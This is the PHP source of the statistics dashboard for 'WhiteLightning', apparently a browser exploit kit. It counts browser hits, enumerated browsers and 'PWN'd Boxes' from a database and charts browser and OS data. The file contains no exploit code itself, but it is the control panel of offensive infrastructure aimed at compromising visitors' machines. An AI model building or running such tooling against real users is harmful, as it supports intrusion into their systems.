<?php
	session_start();
	// Include the configuration file:
	require_once ('includes/config.inc.php'); 
	
	if (isset($_SESSION['name'])) {
		require_once (MYSQL);	
		
		// Count the number of hits:
		$hits_count = "?";
		$q = "SELECT COUNT(hit_id) FROM hits";
		try {
			$r = @mysqli_query ($dbc, $q);
			$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
			$hits_count = $row[0];
		} catch (Exception $e) {
			//echo 'Caught exception: ',  $e->getMessage(), "\n";
			$hits_count = "?";
		}

		// Count the number of hits:
		$throws_count = "?";
		$q = "SELECT COUNT(throw_id) FROM throws";
		try {
			$r = @mysqli_query ($dbc, $q);
			$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
			$throws_count = $row[0];
		} catch (Exception $e) {
			//echo 'Caught exception: ',  $e->getMessage(), "\n";
			$throws_count = "?";
		}
		
		// Count the number of hits:
		$loads_count = "?";
		$q = "SELECT COUNT(load_id) FROM loads";
		try {
			$r = @mysqli_query ($dbc, $q);
			$row = @mysqli_fetch_array ($r, MYSQLI_NUM);
			$loads_count = $row[0];
		} catch (Exception $e) {
			//echo 'Caught exception: ',  $e->getMessage(), "\n";
			$loads_count = "?";
		}
	}else{
		header("Location: login.php");
	}
?>



<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="">
	<meta name="author" content="">

	<title>WhiteLightning</title>

	<!-- Bootstrap Core CSS -->
	<link href="css/bootstrap.min.css" rel="stylesheet">

	<!-- Custom CSS -->
	<link href="css/sb-admin.css" rel="stylesheet">

	<!-- Morris Charts CSS -->
	<link href="css/plugins/morris.css" rel="stylesheet">

	<!-- Custom Fonts -->
	<link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
		<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
	<![endif]-->

</head>
<body>
	<div id="wrapper">
		<?php include('outline.php'); ?>
		<div id="page-wrapper">

			<div class="container-fluid">

				<!-- Page Heading -->
				<div class="row">
					<div class="col-lg-12">
						<h1 class="page-header">
						<small>Statistics Overview</small>
						</h1>
					</div>
				</div>
				<!-- /.row -->

				<div class="row">
					<div class="col-lg-3 col-md-6">
						<div class="panel panel-green">
							<div class="panel-heading">
								<div class="row">
									<div class="col-xs-3">
										<i class="fa fa-tasks fa-5x"></i>
									</div>
									<div class="col-xs-9 text-right">
										<div class="huge"><?php echo $hits_count;?></div>
										<div>Browser Hits!</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col-lg-3 col-md-6">
						<div class="panel panel-yellow">
							<div class="panel-heading">
								<div class="row">
									<div class="col-xs-3">
										<i class="fa fa-shopping-cart fa-5x"></i>
									</div>
									<div class="col-xs-9 text-right">
										<div class="huge"><?php echo $throws_count;?></div>
										<div>Browsers Enumerated!!</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="col-lg-3 col-md-6">
						<div class="panel panel-red">
							<div class="panel-heading">
								<div class="row">
									<div class="col-xs-3">
										<i class="fa fa-support fa-5x"></i>
									</div>
									<div class="col-xs-9 text-right">
										<div class="huge"><?php echo $loads_count;?></div>
										<div>PWN'd Boxes!!!</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- /.row -->

				<div class="row">
					<div class="col-lg-5">
						<div class="panel panel-primary">
							<div class="panel-heading">
								<h3 class="panel-title"><i class="fa fa-long-arrow-right"></i> Browser Statistics</h3>
							</div>
							<div class="panel-body">
								<div id="morris-bar-chart"></div>
							</div>
						</div>
					</div>
					<div class="col-lg-4">
						<div class="panel panel-primary">
							<div class="panel-heading">
								<h3 class="panel-title"><i class="fa fa-long-arrow-right fa-fw"></i> OS Statistics</h3>
							</div>
							<div class="panel-body">
								<div id="morris-donut-chart"></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<!-- jQuery -->
	<script src="js/jquery.js"></script>

	<!-- Bootstrap Core JavaScript -->
	<script src="js/bootstrap.min.js"></script>

	<!-- Morris Charts JavaScript -->
	<script src="js/plugins/morris/raphael.min.js"></script>
	<script src="js/plugins/morris/morris.min.js"></script>
	<script src="js/plugins/morris/morris-data.js"></script>

</body>
</html>


